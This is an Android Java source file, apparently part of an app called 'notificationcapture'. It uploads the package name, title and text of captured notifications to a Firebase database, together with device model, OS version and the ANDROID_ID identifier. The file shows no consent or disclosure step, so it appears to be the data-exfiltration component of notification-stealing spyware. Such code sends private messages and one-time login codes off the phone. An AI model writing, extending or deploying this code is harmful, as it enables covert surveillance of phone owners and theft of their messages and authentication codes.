package com.yourname.notificationcapture;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.HashMap;
import java.util.Map;
import android.os.Build;
import android.provider.Settings;

public class FirebaseUploader {

    private static final String TAG = "FirebaseUploader";
    private DatabaseReference databaseReference;
    private Context context;

    public FirebaseUploader() {
        this.databaseReference = FirebaseDatabase.getInstance().getReference();
    }

    public void setContext(Context context) {
        this.context = context;
    }

    public void uploadNotification(String packageName, String title, String text, long timestamp) {
        if (!isNetworkAvailable()) {
            Log.w(TAG, "No internet connection - Skipping upload");
            return;
        }

        try {
            Map<String, Object> notificationData = new HashMap<>();
            notificationData.put("package", packageName);
            notificationData.put("title", title);
            notificationData.put("text", text);
            notificationData.put("timestamp", timestamp);
            notificationData.put("time_human", formatTime(timestamp));
            
            notificationData.putAll(getDeviceInfo());
            
            String key = "notification_" + System.currentTimeMillis() + "_" + packageName.hashCode();
            
            databaseReference.child("notifications").child(key).setValue(notificationData)
                .addOnSuccessListener(aVoid -> {
                    Log.i(TAG, "Notification uploaded successfully: " + packageName);
                })
                .addOnFailureListener(e -> {
                    Log.e(TAG, "Failed to upload notification: " + e.getMessage());
                });
                
        } catch (Exception e) {
            Log.e(TAG, "Error in uploadNotification: " + e.getMessage());
        }
    }

    private Map<String, Object> getDeviceInfo() {
        Map<String, Object> deviceInfo = new HashMap<>();
        try {
            deviceInfo.put("device_model", Build.MODEL);
            deviceInfo.put("device_brand", Build.BRAND);
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
            if (context != null) {
                deviceInfo.put("device_id", Settings.Secure.getString(
                    context.getContentResolver(), Settings.Secure.ANDROID_ID));
            }
            deviceInfo.put("upload_timestamp", System.currentTimeMillis());
        } catch (Exception e) {
            Log.e(TAG, "Error getting device info: " + e.getMessage());
        }
        return deviceInfo;
    }

    private boolean isNetworkAvailable() {
        if (context == null) return false;
        
        ConnectivityManager connectivityManager = 
            (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    private String formatTime(long timestamp) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            return sdf.format(new Date(timestamp));
        } catch (Exception e) {
            return "Invalid Time";
        }
    }
}
